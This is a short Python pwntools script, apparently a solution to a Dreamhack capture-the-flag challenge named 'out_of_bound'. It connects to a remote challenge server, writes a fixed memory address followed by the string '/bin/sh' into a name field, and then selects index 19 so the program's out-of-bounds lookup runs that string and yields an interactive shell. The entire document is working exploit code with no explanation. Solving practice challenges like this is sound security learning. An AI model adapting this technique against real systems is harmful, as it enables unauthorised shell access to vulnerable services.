from pwn import *

#p = process('./out_of_bound')
p = remote("host3.dreamhack.games", 9056)

name_addr = 0x804a0b0
p.sendlineafter(b"Admin name: ", p32(name_addr)+b"/bin/sh\x00")

p.sendlineafter(b"What do you want?: ", b"19")


p.interactive()
